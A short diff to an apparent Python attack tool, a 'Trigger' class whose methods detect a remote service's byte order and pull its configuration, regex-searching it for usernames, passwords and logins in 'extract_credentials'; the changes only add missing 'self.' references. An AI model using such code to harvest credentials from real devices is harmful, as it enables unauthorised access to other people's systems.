@@ -43,7 +43,7 @@ class Trigger:
         return s
 
     def detect_endian(self):
-        s = connect()
+        s = self.connect()
 
         if s is not None:
             s.send(b"abcd")
@@ -89,11 +89,11 @@ class Trigger:
         return string
 
     def extract_credentials(self):
-        endian = detect_endian()
-        s = connect()
+        endian = self.detect_endian()
+        s = self.connect()
 
         if s is not None and endian is not None:
-            config = talk(s, endian, 1)
+            config = self.talk(s, endian, 1)
 
             lines = re.split("\x00|\x01", config.decode())
             pattern = re.compile('user(name)?|password|login')
